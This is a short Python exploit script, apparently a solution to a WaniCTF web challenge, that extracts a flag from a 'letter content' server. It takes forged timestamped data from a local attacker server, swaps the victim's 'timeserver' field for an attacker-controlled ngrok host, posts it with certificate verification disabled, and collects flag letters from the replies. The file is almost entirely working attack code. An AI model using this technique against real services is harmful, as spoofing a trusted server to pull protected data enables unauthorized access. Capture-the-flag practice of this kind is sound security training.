import requests
import json
import re
import warnings
from urllib3.exceptions import InsecureRequestWarning

warnings.simplefilter('ignore', InsecureRequestWarning)

attacker_server_local = "http://127.0.0.1:5001/"
attacker_server_remote = "31d6-186-121-197-233.ngrok-free.app/"
victim_server_letter_content = "https://web-one-day-one-letter-content-lz56g6.wanictf.org/"

flag = "FLAG{"

for i in range(0, 11):
    timestamp =  int(str(i) + "12345")
    data_server_attacker = requests.get(attacker_server_local + f"?timestamp={timestamp}")
    #requests.post(victim_server_letter_content)
    data_send_server_letter_content = json.loads(data_server_attacker.text)
    data_send_server_letter_content["timeserver"] = attacker_server_remote

    headers = {
        "Content-Type": "application/json"
    }
    pattern = r"FLAG\{(.*?)\}"
    r = requests.post(victim_server_letter_content, headers=headers,json=data_send_server_letter_content, verify=False)
    matches = re.findall(pattern, r.text)

    for match in matches:
        flag += match.replace("?", "")

print(flag + "}")
    
